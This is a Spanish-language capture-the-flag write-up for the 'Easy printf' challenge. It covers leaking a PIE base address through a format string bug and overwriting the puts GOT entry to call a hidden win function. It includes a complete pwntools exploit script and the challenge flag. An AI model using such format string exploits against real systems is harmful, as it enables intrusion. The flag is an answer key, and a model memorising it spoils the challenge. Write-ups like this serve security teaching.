# Easy printf

## Analisis
```
checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   33 Symbols	  No	0		2		vuln
```

El binario tiene Partial RELRO, lo que significa que la sección .got.plt (Global Offset Table for PLT) sigue siendo modificable para permitir la carga dinámica de funciones (lazy binding).

Tambien acepta dos entradas de usuario, en ambas es vulnerable a cadena formateada:
```
./vuln
Haha my buffer cant be overflowed and there is pie, ill even let you read and print twice
%p
0x7ffcc0d762d0
@%x
c0d762d0
@nice try
```

Mas informacion sobre la vulnerabilidad de cadena formateada [aqui](https://axcheron.github.io/exploit-101-format-strings/)

Tiene una funcion `win` que llama a `system` para leer la flag:
```
nm vuln | grep -i " t "
0000000000001290 T _fini
0000000000001000 T _init
00000000000011b3 T main
0000000000001090 T _start
0000000000001189 T win
```
```
[0x00001090]> s sym.win ;pdf
/ 42: sym.win ();
|           0x00001189      55             push rbp
|           0x0000118a      4889e5         mov rbp, rsp
|           0x0000118d      488d05740e..   lea rax, str.what_how_did_you_do_it__________ ; 0x2008 ; "what how did you do it??????????"
|           0x00001194      4889c7         mov rdi, rax                ; const char *format
|           0x00001197      b800000000     mov eax, 0
|           0x0000119c      e8cffeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x000011a1      488d05810e..   lea rax, str.cat_flag.txt   ; 0x2029 ; "cat flag.txt"
|           0x000011a8      4889c7         mov rdi, rax                ; const char *string
|           0x000011ab      e8b0feffff     call sym.imp.system         ; int system(const char *string)
|           0x000011b0      90             nop
|           0x000011b1      5d             pop rbp
\           0x000011b2      c3             ret
```

Sin embargo no es invocada desde ningun sitio:
```
[0x000011b3]> axt sym.win
[0x000011b3]>
```

Nuestro objetivo es lograr invocar la funcion `win()` por medio de la sobreescritura de la seccion .got.plt

## Filtrado y calculo de direcciones de memoria

Si ccolocamos un breakpoint antes del printf que hace echo a la primera entrada (*main+132) y observamos la pila vemos que el parametro #25 contiene la direccion de main:

![2025-04-18-162221_518x675_scrot](https://github.com/user-attachments/assets/cba53bea-6502-4902-8272-333f2c0d6e96)

Con ese valor y el offset de main podemos calcular la direccion base del binario:
```
nm vuln | grep main
                 U __libc_start_main@GLIBC_2.34
00000000000011b3 T main
```

``` python
from pwn import *
elf = context.binary = ELF("./vuln")
io = process("./vuln")
#io = remote("74.207.229.59","20221")
#gdb.attach(io,gdbscript="""
#           break *main+186
#           """)

# Conseguir la direccion base del binario
io.recvuntil(b"Haha my buffer cant be overflowed and there is pie, ill even let you read and print twice")
io.sendline(b'%25$p')

io.recvline()
leak = int(io.recvline().strip(),16)
main_offset = 0x000011b3 
elf.address = leak - main_offset
```

## Sobreescritura de puts
El flujo del programa se realiza en main, no podemos sobreescribir la direccion de retorno, pero podemos sobreescribir la direccion de una funcion despues de la segunda entrada en `.got.plt`, `puts`.

Ya tenemos la direccion base, para la sobreescritura del GOT usaremos la utilidad de pwntools `fmtstr_payload`. Si bien puede hacerse manual, este metodo es mas eficiente:
``` python
# Sobreescribir la direccion de puts en la GOT
payload = fmtstr_payload(6, {elf.got.puts:elf.sym.win},write_size='short') # Automatico
io.sendline(payload)
io.recvuntil(b"how did you do it??????????")
success(f"flag.txt: {io.recvline().decode()}")
```

## Solucion final
``` python
from pwn import *
elf = context.binary = ELF("./vuln")
io = process("./vuln")
#io = remote("74.207.229.59","20221")
#gdb.attach(io,gdbscript="""
#           break *main+186
#           """)

# Conseguir la direccion base del binario
io.recvuntil(b"Haha my buffer cant be overflowed and there is pie, ill even let you read and print twice")
io.sendline(b'%25$p')
io.recvline()
leak = int(io.recvline().strip(),16)
main_offset = 0x000011b3 
elf.address = leak - main_offset

# Sobreescribir la direccion de puts en .got.plt
payload = fmtstr_payload(6, {elf.got.puts:elf.sym.win},write_size='short') # Automatico
io.sendline(payload)
io.recvuntil(b"how did you do it??????????")
success(f"flag.txt: {io.recvline().decode()}")
```

`texsaw{Pr1nt1ng_tHe_Fs_15_e4sy}`

